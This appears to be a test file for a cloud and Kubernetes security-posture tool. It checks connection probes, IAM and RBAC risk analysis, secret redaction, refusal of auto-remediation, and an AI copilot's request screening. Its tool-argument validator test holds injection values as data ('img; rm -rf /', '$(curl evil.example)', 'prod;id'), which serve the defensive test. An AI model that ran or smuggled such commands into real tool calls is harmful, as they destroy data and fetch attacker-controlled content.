import { describe, expect, it } from "vitest";
import {
  APPROVED_STEAMPIPE_PACKS, CLOUD_PIPELINE_STAGES, CLOUD_V2_REPORTS,
  CONTAINER_PIPELINE_STAGES, DEFAULT_CLOUD_BASELINE_RULES, DEFAULT_IMAGE_POLICY,
  DEFAULT_KUBERNETES_BASELINE_RULES,
  FIXTURE_FALCO_EVENT, FIXTURE_IDENTITIES, FIXTURE_K8S_BINDINGS, FIXTURE_K8S_ROLES,
  FIXTURE_PROBE_AUTH_FAILED, FIXTURE_PROBE_CONNECTED, FIXTURE_PROBE_CORE_LIMITED,
  FIXTURE_PROBE_EXPIRED, FIXTURE_PROBE_LIMITED, FIXTURE_PROBE_MISMATCH,
  FIXTURE_PROBE_NOT_CONFIGURED, FIXTURE_RESOURCES, FIXTURE_RESOURCE_WITH_SECRET,
  FIXTURE_RUNTIME_FINDINGS, FIXTURE_RUNTIME_IMAGES, FIXTURE_RUNTIME_WORKLOADS,
  KUBERNETES_PIPELINE_STAGES,
  analyzeAdmissionPosture, analyzeCloudIamPosture, analyzeKubernetesRbac,
  buildCloudAttackPathCandidates, buildCloudCoverage, buildCloudExposureGraph,
  buildContainerCoverage, buildIamGraphEdges, buildKubernetesAttackPathCandidates,
  buildKubernetesCoverage, buildResourceSnapshot, buildToolArgv,
  cloudRemediationPlanOnlyAnswer, completionForGaps, correlateRuntimeEvent,
  diffResourceSets, diffResourceSnapshots, evaluateAutoRemediationRequest,
  evaluateBaselineDeviations, evaluateCloudAuthorization, evaluateCloudConnection,
  evaluateImagePolicy, evaluateSteampipeQueryRequest, hashBaselineRules,
  iacFindingIdentity, planCloudNlQuery, planCloudVerification,
  planContainerVerification, planKubernetesVerification, sanitizeIacEvidence,
  screenCloudAiRequest, toolJobConstraints, validateToolArgument,
} from "./index";

describe("connection tests (§12/§143–§145)", () => {
  it("connected when probe facts are clean", () => {
    expect(evaluateCloudConnection(FIXTURE_PROBE_CONNECTED).result).toBe("CONNECTED");
  });
  it("§143: invalid credential → AUTH_FAILED with no secret leakage in the record", () => {
    const out = evaluateCloudConnection(FIXTURE_PROBE_AUTH_FAILED);
    expect(out.result).toBe("AUTH_FAILED");
    expect(JSON.stringify(out)).not.toMatch(/AKIA|secret[_-]?key\s*=/i);
  });
  it("expired credential → EXPIRED", () => {
    expect(evaluateCloudConnection(FIXTURE_PROBE_EXPIRED).result).toBe("EXPIRED");
  });
  it("§144: non-core missing permission → CONNECTED_WITH_LIMITATIONS, gap recorded", () => {
    const out = evaluateCloudConnection(FIXTURE_PROBE_LIMITED);
    expect(out.result).toBe("CONNECTED_WITH_LIMITATIONS");
    expect(out.missingPermissions.length).toBe(1);
  });
  it("§144: core missing permission → PERMISSION_LIMITED", () => {
    expect(evaluateCloudConnection(FIXTURE_PROBE_CORE_LIMITED).result).toBe("PERMISSION_LIMITED");
  });
  it("§145: credential/account mismatch → blocked verdict with accountMatch=false", () => {
    const out = evaluateCloudConnection(FIXTURE_PROBE_MISMATCH);
    expect(out.accountMatch).toBe(false);
    expect(out.limitations[0]?.code).toBe("ACCOUNT_MISMATCH");
  });
  it("unwired transport is honestly UNREACHABLE, never CONNECTED", () => {
    const out = evaluateCloudConnection(FIXTURE_PROBE_NOT_CONFIGURED);
    expect(out.result).toBe("UNREACHABLE");
    expect(out.limitations[0]?.code).toBe("TRANSPORT_NOT_CONFIGURED");
  });
  it("missing credential reference → AUTH_FAILED / SECRET_UNAVAILABLE", () => {
    const out = evaluateCloudConnection({ credentialReferencePresent: false, transportConfigured: true });
    expect(out.result).toBe("AUTH_FAILED");
    expect(out.limitations[0]?.code).toBe("SECRET_UNAVAILABLE");
  });
});

describe("authorization (§8)", () => {
  const base = {
    authorizationId: "auth-1", authorizationStatus: "APPROVED", accountProvider: "AWS",
    authorizationProvider: "AWS", externalAccountId: "123456789012", authorizationAccountId: "123456789012",
    credentialReference: "vault:cloud/aws/assessment-ro", allowedRegions: ["us-east-1"], requestedRegions: ["us-east-1"],
  };
  it("allows a fully matching authorization", () => {
    expect(evaluateCloudAuthorization(base).allowed).toBe(true);
  });
  it("blocks without an authorization record", () => {
    expect(evaluateCloudAuthorization({ ...base, authorizationId: null }).allowed).toBe(false);
  });
  it("blocks provider mismatch and out-of-scope regions", () => {
    expect(evaluateCloudAuthorization({ ...base, authorizationProvider: "GCP" }).allowed).toBe(false);
    expect(evaluateCloudAuthorization({ ...base, requestedRegions: ["eu-west-1"] }).allowed).toBe(false);
  });
  it("refuses a secret-shaped value stored as a credential reference", () => {
    const out = evaluateCloudAuthorization({ ...base, credentialReference: "AKIAIOSFODNN7EXAMPLE" });
    expect(out.allowed).toBe(false);
  });
});

describe("snapshots + drift (§17/§18/§147)", () => {
  it("snapshot hash is stable and configuration is bounded", () => {
    const a = buildResourceSnapshot(FIXTURE_RESOURCES[1]!);
    const b = buildResourceSnapshot(FIXTURE_RESOURCES[1]!);
    expect(a.configurationHash).toBe(b.configurationHash);
  });
  it("§147: planted secret-shaped value never reaches the snapshot", () => {
    const snap = buildResourceSnapshot(FIXTURE_RESOURCE_WITH_SECRET);
    expect(JSON.stringify(snap)).not.toContain("AKIAFAKECANARY");
    expect(JSON.stringify(snap)).not.toContain("API_KEY");
  });
  it("exposure drift to PUBLIC is ELEVATED PUBLIC_EXPOSURE", () => {
    const before = buildResourceSnapshot({ ...FIXTURE_RESOURCES[1]!, exposure: "PRIVATE" });
    const after = buildResourceSnapshot({ ...FIXTURE_RESOURCES[1]!, exposure: "PUBLIC" });
    const events = diffResourceSnapshots("arn:aws:s3:::app-data", before, after);
    expect(events.some((e) => e.kind === "PUBLIC_EXPOSURE" && e.riskSignal === "ELEVATED")).toBe(true);
  });
  it("logging disabled is classified distinctly", () => {
    const before = buildResourceSnapshot(FIXTURE_RESOURCES[1]!);
    const after = buildResourceSnapshot({ ...FIXTURE_RESOURCES[1]!, configuration: { encryption: "AES256", logging: false } });
    const events = diffResourceSnapshots("arn:aws:s3:::app-data", before, after);
    expect(events.some((e) => e.kind === "LOGGING_DISABLED")).toBe(true);
  });
  it("set drift reports added/removed resources", () => {
    const events = diffResourceSets(["a", "b"], ["b", "c"]);
    expect(events.map((e) => e.kind).sort()).toEqual(["RESOURCE_ADDED", "RESOURCE_REMOVED"]);
  });
});

describe("IAM posture, graph, attack paths (§28–§33)", () => {
  it("flags stale privileged, long-lived key and missing MFA from explicit facts only", () => {
    const signals = analyzeCloudIamPosture(FIXTURE_IDENTITIES, { now: new Date("2026-10-08T00:00:00Z") });
    const kinds = signals.map((s) => s.kind);
    expect(kinds).toContain("STALE_PRIVILEGED_IDENTITY");
    expect(kinds).toContain("LONG_LIVED_CREDENTIAL");
    expect(kinds).toContain("MISSING_MFA_EVIDENCE");
    expect(kinds).toContain("OVERLY_BROAD_PERMISSIONS");
  });
  it("unknown MFA / last-used never produce signals", () => {
    const signals = analyzeCloudIamPosture([{ ...FIXTURE_IDENTITIES[0]! }]);
    expect(signals).toHaveLength(0);
  });
  it("graph edges cover CAN_ASSUME / TRUSTS vocabulary and resource access (§31)", () => {
    const edges = buildIamGraphEdges(FIXTURE_IDENTITIES, FIXTURE_RESOURCES);
    const rels = edges.map((e) => e.relationship);
    expect(rels).toContain("CAN_ASSUME");
    expect(rels).toContain("ASSUMES");
    expect(rels).toContain("GRANTS");
    expect(rels).toContain("ATTACHED_TO");
  });
  it("§32/§33: attack-path candidate is analytical, labelled, never executed", () => {
    const edges = buildIamGraphEdges(FIXTURE_IDENTITIES, FIXTURE_RESOURCES);
    const paths = buildCloudAttackPathCandidates({ resources: FIXTURE_RESOURCES, identities: FIXTURE_IDENTITIES, edges });
    expect(paths.length).toBeGreaterThan(0);
    expect(paths[0]?.executed).toBe(false);
    expect(paths[0]?.steps.some((s) => s.evidence === "OBSERVED")).toBe(true);
  });
});

describe("Steampipe + CloudMapper (§23–§25)", () => {
  it("approved pack + query is allowed", () => {
    const out = evaluateSteampipeQueryRequest({ packId: "aws-posture-cis", queryId: "aws.posture.public_storage" });
    expect(out.allowed).toBe(true);
  });
  it("§25: raw SQL is rejected before any adapter", () => {
    const out = evaluateSteampipeQueryRequest({ rawSql: "select * from aws_s3_bucket" });
    expect(out.allowed).toBe(false);
  });
  it("unknown pack/query rejected", () => {
    expect(evaluateSteampipeQueryRequest({ packId: "nope", queryId: "x" }).allowed).toBe(false);
    expect(APPROVED_STEAMPIPE_PACKS.length).toBeGreaterThan(0);
  });
  it("exposure graph has internet node + EXPOSES edges only from inventory", () => {
    const graph = buildCloudExposureGraph(FIXTURE_RESOURCES);
    expect(graph.nodes[0]?.kind).toBe("INTERNET");
    expect(graph.edges.some((e) => e.relationship === "EXPOSES")).toBe(true);
  });
});

describe("image policy + IaC (§62/§65–§69/§148–§151)", () => {
  it("§148: digest identity — same digest under two tags is one image identity", () => {
    const a = evaluateImagePolicy({ registry: "ghcr.io", repository: "app", tag: "v1", digest: "sha256:abc" }, DEFAULT_IMAGE_POLICY);
    const b = evaluateImagePolicy({ registry: "ghcr.io", repository: "app", tag: "v2", digest: "sha256:abc" }, DEFAULT_IMAGE_POLICY);
    expect(a.violations.map((v) => v.rule)).toEqual(b.violations.map((v) => v.rule));
  });
  it("latest tag + root user violate the default policy", () => {
    const out = evaluateImagePolicy({ registry: "docker.io", repository: "app", tag: "latest", config: { user: "root" } }, DEFAULT_IMAGE_POLICY);
    expect(out.compliant).toBe(false);
    expect(out.violations.map((v) => v.rule)).toEqual(expect.arrayContaining(["latest-tag", "root-user"]));
  });
  it("unapproved registry is a HIGH violation when a list is set", () => {
    const out = evaluateImagePolicy({ registry: "evil.example.com", repository: "app", tag: "v1", config: { user: "1000" } }, { ...DEFAULT_IMAGE_POLICY, approvedRegistries: ["ghcr.io"] });
    expect(out.violations.some((v) => v.rule === "approved-registry")).toBe(true);
  });
  it("§67: IaC identity is stable across line drift; §69 snippet secrets redacted", () => {
    const id1 = iacFindingIdentity({ repository: "repo", filePath: "main.tf", resource: "aws_s3_bucket.data", ruleId: "CKV_AWS_20", lineStart: 10 });
    const id2 = iacFindingIdentity({ repository: "repo", filePath: "main.tf", resource: "aws_s3_bucket.data", ruleId: "CKV_AWS_20", lineStart: 42 });
    expect(id1.fingerprint).toBe(id2.fingerprint);
    const evidence = sanitizeIacEvidence({ repository: "repo", filePath: "main.tf", resource: "aws_s3_bucket.data", ruleId: "CKV_AWS_20", snippet: "access_key = \"AKIAFAKECANARY000000\"" });
    expect(evidence.snippet ?? "").not.toContain("AKIAFAKECANARY");
    expect(evidence.liveRuleId).toBe("storage-public-access");
  });
});

describe("Kubernetes RBAC + admission + attack paths (§76/§77/§85/§89/§152–§154)", () => {
  it("§152: controlled wildcard role → RBAC risk; cluster-admin binding is CRITICAL", () => {
    const { risks } = analyzeKubernetesRbac(FIXTURE_K8S_ROLES, FIXTURE_K8S_BINDINGS);
    expect(risks.some((r) => r.kind === "WILDCARD_PERMISSIONS")).toBe(true);
    expect(risks.some((r) => r.kind === "CLUSTER_ADMIN_BINDING" && r.severity === "CRITICAL")).toBe(true);
    expect(risks.some((r) => r.kind === "SECRET_ACCESS")).toBe(true);
  });
  it("§77: graph edges SUBJECT → ROLE and ROLE → RESOURCE exist", () => {
    const { edges } = analyzeKubernetesRbac(FIXTURE_K8S_ROLES, FIXTURE_K8S_BINDINGS);
    expect(edges.some((e) => e.relationship === "BOUND_TO")).toBe(true);
    expect(edges.some((e) => e.relationship === "GRANTS" && e.toType === "RESOURCE")).toBe(true);
  });
  it("§85: no PSA labels + no policy engine → admission observations", () => {
    const obs = analyzeAdmissionPosture({ policyEngines: [], imagePolicyPresent: false });
    expect(obs.map((o) => o.kind)).toEqual(expect.arrayContaining(["PSA_NOT_ENFORCED", "NO_POLICY_ENGINE", "IMAGE_POLICY_ABSENT"]));
  });
  it("§89/§159: public workload + overprivileged SA → potential path, never executed", () => {
    const { risks } = analyzeKubernetesRbac(FIXTURE_K8S_ROLES, FIXTURE_K8S_BINDINGS);
    const paths = buildKubernetesAttackPathCandidates({
      workloads: [{ namespace: "prod", kind: "Deployment", name: "web", serviceAccount: "web-sa", exposure: "PUBLIC_INTERNET", criticalVulnerabilities: 2 }],
      rbacRisks: risks,
    });
    expect(paths).toHaveLength(1);
    expect(paths[0]?.executed).toBe(false);
    expect(paths[0]?.confidence).toBe("HIGH");
  });
});

describe("Falco correlation (§91–§95/§141/§158)", () => {
  it("§158: runtime event links pod → workload → image → known vulnerability", () => {
    const out = correlateRuntimeEvent(FIXTURE_FALCO_EVENT, {
      workloads: FIXTURE_RUNTIME_WORKLOADS, images: FIXTURE_RUNTIME_IMAGES, findings: FIXTURE_RUNTIME_FINDINGS,
    });
    expect(out.workloadRef).toBe("prod/Deployment/web");
    expect(out.imageId).toBe("img-1");
    expect(out.findingIds).toEqual(["find-1"]);
    expect(out.confidence).toBe("HIGH");
    expect(out.socAlertRecommended).toBe(true);
    expect(out.contextualRiskSignal).toBe("ELEVATED");
  });
  it("uncorrelated event stays a LOW-confidence SOC signal", () => {
    const out = correlateRuntimeEvent({ ...FIXTURE_FALCO_EVENT, namespace: "other", pod: "x-1" }, {
      workloads: FIXTURE_RUNTIME_WORKLOADS, images: FIXTURE_RUNTIME_IMAGES, findings: FIXTURE_RUNTIME_FINDINGS,
    });
    expect(out.confidence).toBe("LOW");
    expect(out.socAlertRecommended).toBe(false);
  });
});

describe("baselines, coverage, pipelines (§97–§115)", () => {
  it("baseline rules hash is order-insensitive; deviations only from known facts", () => {
    const h1 = hashBaselineRules(DEFAULT_CLOUD_BASELINE_RULES);
    const h2 = hashBaselineRules([...DEFAULT_CLOUD_BASELINE_RULES].reverse());
    expect(h1).toBe(h2);
    const deviations = evaluateBaselineDeviations(DEFAULT_CLOUD_BASELINE_RULES, { "storage-public-access": "PRESENT", "audit-logging-disabled": "ABSENT" });
    expect(deviations).toHaveLength(1);
    expect(deviations[0]?.ruleId).toBe("storage-public-access");
  });
  it("§110: partial inventory → COMPLETED_WITH_GAPS, never clean", () => {
    const out = buildCloudCoverage({
      accountsCovered: 1, regionsCovered: 1, regionsAuthorized: 3, servicesCovered: 5,
      resourcesCovered: 40, iamIdentities: 12, postureChecks: 30,
      connectionResult: "CONNECTED_WITH_LIMITATIONS", missingPermissions: ["iam:ListUsers"], transportConfigured: true,
    });
    expect(out.completion).toBe("COMPLETED_WITH_GAPS");
    expect(out.gaps.some((g) => g.reason === "MISSING_PERMISSION")).toBe(true);
    expect(completionForGaps([])).toBe("COMPLETED");
  });
  it("container coverage ratios are null when nothing observed (never fabricated)", () => {
    const out = buildContainerCoverage({ registriesCovered: 0, repositoriesCovered: 0, imagesCovered: 0, imagesWithSbom: 0, imagesScanned: 0, deploymentCorrelated: 0, transportConfigured: false });
    expect(out.coverage.sbomCoverage).toBeNull();
  });
  it("kubernetes coverage flags missing runtime telemetry + benchmark gaps", () => {
    const out = buildKubernetesCoverage({ namespacesCovered: 2, workloadsCovered: 5, rbacSubjects: 3, benchmarkChecks: 0, imagesCorrelated: 5, workloadsTotal: 5, runtimeTelemetry: false, transportConfigured: false });
    expect(out.completion).toBe("COMPLETED_WITH_GAPS");
    expect(DEFAULT_KUBERNETES_BASELINE_RULES.length).toBeGreaterThan(0);
  });
  it("pipelines match §103–§105 stage order", () => {
    expect(CLOUD_PIPELINE_STAGES[0]).toBe("CONNECT");
    expect(CLOUD_PIPELINE_STAGES).toContain("IAM");
    expect(CONTAINER_PIPELINE_STAGES[0]).toBe("IMAGE_DISCOVERY");
    expect(KUBERNETES_PIPELINE_STAGES).toContain("RBAC");
    expect(KUBERNETES_PIPELINE_STAGES).toContain("RUNTIME_SIGNALS");
  });
});

describe("tool-job safety (§106–§109/§161) + verification (§121–§125)", () => {
  it("every job is worker-isolated with resource bounds", () => {
    const c = toolJobConstraints("prowler");
    expect(c.isolation).toBe("SCANNER_WORKER");
    expect(c.timeoutSeconds).toBeGreaterThan(0);
    expect(c.outputLimitBytes).toBeGreaterThan(0);
  });
  it("§161: shell-syntax values are rejected as data, never executed", () => {
    expect(validateToolArgument("img; rm -rf /").ok).toBe(false);
    expect(validateToolArgument("$(curl evil.example)").ok).toBe(false);
    expect(validateToolArgument("ghcr.io/example/web:v1").ok).toBe(true);
    expect(() => buildToolArgv(["--namespace", "prod;id"])).toThrow();
    expect(buildToolArgv(["-n", "prod"])).toEqual(["-n", "prod"]);
  });
  it("verification plans never mutate the target (§121–§123)", () => {
    expect(planCloudVerification("storage-public-access").mutatesTarget).toBe(false);
    expect(planCloudVerification("storage-public-access").methods).toContain("CONFIGURATION_REREAD");
    expect(planContainerVerification().methods).toContain("NEW_IMAGE_DIGEST");
    expect(planKubernetesVerification("RBAC").methods).toContain("RBAC_REEVALUATION");
  });
  it("§124/§160: auto-remediation actions are always refused", () => {
    for (const action of ["MAKE_BUCKET_PRIVATE", "CHANGE_IAM", "RESTART_WORKLOAD", "DELETE_RESOURCE"]) {
      expect(evaluateAutoRemediationRequest(action).allowed).toBe(false);
    }
  });
});

describe("AI copilot + NL queries + reports (§133/§135–§137/§160)", () => {
  it("§160: 'make buckets private and remove admin roles' → plan only, executed=false", () => {
    const screen = screenCloudAiRequest("Make all buckets private and remove admin roles");
    expect(screen.allowed).toBe(false);
    const answer = cloudRemediationPlanOnlyAnswer("Make all buckets private and remove admin roles", [{ title: "Public bucket app-data", remediation: "Enable S3 Block Public Access" }]);
    expect(answer.executed).toBe(false);
    expect(answer.planSteps[0]).toContain("Public bucket app-data");
  });
  it("secret retrieval and attack execution are refused (§136)", () => {
    expect(screenCloudAiRequest("Show me the kubeconfig secret values").allowed).toBe(false);
    expect(screenCloudAiRequest("Execute the attack path to the database").allowed).toBe(false);
  });
  it("§137: the five canonical queries map deterministically", () => {
    expect(planCloudNlQuery("Show public production databases").plan?.kind).toBe("PUBLIC_PRODUCTION_DATABASES");
    expect(planCloudNlQuery("Show KEV vulnerabilities in running containers").plan?.kind).toBe("KEV_RUNNING_CONTAINERS");
    expect(planCloudNlQuery("Which clusters have privileged workloads?").plan?.kind).toBe("PRIVILEGED_WORKLOAD_CLUSTERS");
    expect(planCloudNlQuery("Which identities have broad permissions?").plan?.kind).toBe("BROAD_PERMISSION_IDENTITIES");
    expect(planCloudNlQuery("Show internet-facing workloads with critical vulnerabilities").plan?.kind).toBe("INTERNET_WORKLOADS_CRITICAL_VULNS");
  });
  it("§133: report catalog covers the eight V2 reports on the P20 engine", () => {
    expect(CLOUD_V2_REPORTS).toHaveLength(8);
    expect(CLOUD_V2_REPORTS.every((r) => r.reportType.length > 0)).toBe(true);
  });
});
